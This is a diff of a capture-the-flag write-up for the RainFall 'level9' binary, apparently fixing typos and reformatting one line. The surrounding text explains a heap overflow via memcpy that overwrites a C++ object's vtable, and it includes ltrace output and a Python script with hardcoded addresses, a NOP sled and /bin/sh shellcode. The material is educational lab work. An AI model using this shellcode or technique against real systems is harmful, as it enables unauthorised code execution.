@@ -6,7 +6,7 @@ The program allocates two instances of the class `N`. The class contains an inte
 In the function setAnnotation, we will memcpy the entirety of our argv[1] into this char array.
 
 
-We can override the vtable of the next object, the table that contains the object's methods,  replacing it with addresses to a  shell code in a  memory region we control, also adding a nope slide for extra piece of mind.
+We can override the vtable of the next object, the table that contains the object's methods, replacing it with addresses to a  shell code in a  memory region we control, also adding a nope slide for extra peace of mind.
 Let's get the address of the first object and check what it looks like in memory
 ```shell
 level9@RainFall:~$ ltrace ./level9 ""
@@ -62,7 +62,7 @@ t's now time to craft our exploit, we'll write our own vtable only consisting of
 
 It will look like this:
 ```markdown
-our fake vtable (start of shellcode `0x804A05C` * 8) -> 32bytes | padding (NOP `0x90`*48) -> 48bytes | shellcode -> 28 bytes | = 108 bytes, replacing 2nd obj vtable with ours at `0x804a00C`
+our fake vtable (start of shellcode `0x804A05C` * 8) -> 32bytes | padding (NOP `0x90`*48) -> 48bytes | shellcode -> 28 bytes | = 108 bytes, replacing 2nd obj vtable with ours at `0x804a00C`.
 ```
 
 
@@ -72,7 +72,7 @@ Let's put it together in python
 destination="\x0c\xa0\x04\x08"
 start_of_shellcode="\x5c\xa0\x04\x08"
 vtable=start_of_shellcode*8
-padding="\x90"*0x30
+padding="\x90" * 48
 shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 print vtable + padding + shellcode + destination
 ```
